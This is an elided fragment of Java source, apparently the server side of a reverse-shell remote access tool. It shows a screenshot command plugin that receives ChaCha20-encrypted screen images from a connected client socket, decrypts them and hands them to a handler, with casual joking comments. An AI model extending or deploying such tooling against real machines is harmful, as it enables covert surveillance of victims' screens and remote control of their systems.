...
import obs1d1anc1ph3r.reverseshell.server.utils.ReceiveScreenShot;
...
public class ScreenshotCommand implements CommandPlugin {
    ...
    public void execute(DataInputStream dataIn, DataOutputStream dataOut, byte[] encryptionKey, Socket clientSocket) throws Exception {
        ...
        byte[] imageBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedImageBytes); //Wow, such decrypted

        screenshotHandler.receiveScreenshotData(imageBytes); //Yeah, I don't wanna deal with this anymore, here
    }
}
